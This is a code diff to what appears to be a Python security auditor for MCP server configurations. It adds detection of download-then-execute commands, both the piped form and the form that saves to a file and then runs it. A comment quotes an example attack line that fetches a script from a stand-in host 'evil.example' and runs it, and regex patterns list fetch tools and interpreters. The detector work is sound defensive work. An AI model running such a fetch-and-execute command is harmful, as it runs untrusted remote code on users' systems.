@@ -29,11 +29,51 @@ SHELL_BINARIES = {
 # is involved, the shell-binary branch of MCPA001 catches that directly.
 SHELL_METACHARS = re.compile(r"\|\||&&|[;|]|\$\(|>>|<\(|\x60")
 
+_FETCHERS = r"curl|wget|iwr|invoke-webrequest|invoke-restmethod|irm"
+_INTERPRETERS = (r"sh|bash|zsh|python[0-9.]*|node|iex|invoke-expression|perl|ruby"
+                 r"|powershell|pwsh")
+
 PIPE_TO_INTERPRETER = re.compile(
-    r"(?:curl|wget|iwr|invoke-webrequest|invoke-restmethod|irm)\b[^|]*\|\s*"
-    r"(?:sudo\s+)?(?:sh|bash|zsh|python[0-9.]*|node|iex|invoke-expression|perl|ruby)\b",
+    r"(?:" + _FETCHERS + r")\b[^|]*\|\s*"
+    r"(?:sudo\s+)?(?:" + _INTERPRETERS + r")\b",
     re.IGNORECASE,
 )
+
+# The same attack written as two commands instead of one pipeline:
+#
+#     curl -o /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh
+#
+# Nothing about it is safer than the pipe, and a rule that only knows the pipe
+# reads it as two unremarkable commands.
+_FETCH_TO_FILE = re.compile(
+    r"(?:" + _FETCHERS + r")\b[^;&|\n]*?"
+    r"(?:-o|-O|--output|-OutFile)\s+(\S+)",
+    re.IGNORECASE,
+)
+_RUNS_FILE = r"(?:sudo\s+)?(?:" + _INTERPRETERS + r")\b[^;&|\n]*?"
+
+
+def fetches_then_runs(line: str) -> bool:
+    """A download followed by an interpreter running *that file*.
+
+    The second half matters. `wget -O model.bin ...; node server.js` downloads
+    something and then starts a server, which is ordinary, and an earlier
+    version of this fired on it -- the pattern saw a fetch, a separator and an
+    interpreter and asked no further questions. Tying the interpreter to the
+    downloaded name is the whole difference between the attack and a build
+    step.
+    """
+    for match in _FETCH_TO_FILE.finditer(line):
+        target = match.group(1).strip("\"'")
+        if not target or target == "-":
+            continue        # -O- is the pipe form, handled above
+        base = re.split(r"[\\/]", target)[-1]
+        if not base:
+            continue
+        rest = line[match.end():]
+        if re.search(_RUNS_FILE + re.escape(base) + r"\b", rest, re.IGNORECASE):
+            return True
+    return False
 
 RUNNERS = {"npx", "bunx", "pnpx", "uvx", "pipx", "yarn", "pnpm", "deno", "bun"}
 
@@ -136,7 +176,7 @@ def curl_pipe_shell(ctx: AuditContext) -> Iterable[Finding]:
     """Server startup downloads code and executes it immediately."""
     for s in _active(ctx):
         line = s.command_line
-        if not PIPE_TO_INTERPRETER.search(line):
+        if not (PIPE_TO_INTERPRETER.search(line) or fetches_then_runs(line)):
             continue
         yield Finding(
             rule_id="MCPA002",
